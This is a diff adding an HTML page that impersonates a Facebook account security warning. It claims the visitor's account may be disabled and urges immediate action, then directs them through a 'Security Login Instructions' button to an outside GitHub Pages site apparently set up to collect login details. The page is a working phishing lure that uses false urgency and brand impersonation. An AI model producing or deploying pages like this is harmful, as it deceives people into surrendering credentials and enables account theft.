@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Security Warning</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #d9534f; /* Bootstrap danger color */
+        }
+        .warning-link, .best-option {
+            display: inline-block;
+            padding: 12px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 10px 0;
+            transition: all 0.3s;
+            width: calc(100% - 20px);
+        }
+        .warning-link {
+            background-color: #d9534f; /* Red */
+            color: white;
+        }
+        .warning-link:hover {
+            background-color: #c9302c; /* Darker red */
+        }
+        .best-option {
+            background-color: #5cb85c; /* Green */
+            color: white;
+        }
+        .best-option:hover {
+            background-color: #4cae4c; /* Darker green */
+        }
+        .instruction {
+            margin: 20px 0;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Facebook Account Security Warning</h1>
+    <p class="instruction">IMPORTANT: Your Facebook account may be disabled. Please take action immediately!</p>
+
+    <a href="#" class="warning-link">Disable Account Warning</a>
+
+    <p class="instruction">For the best option, please click the link below for important security instructions:</p>
+
+    <a href="https://cassycast06.github.io/Security-Login/" target="_blank" class="best-option">Security Login Instructions</a>
+</div>
+
+</body>
+</html>
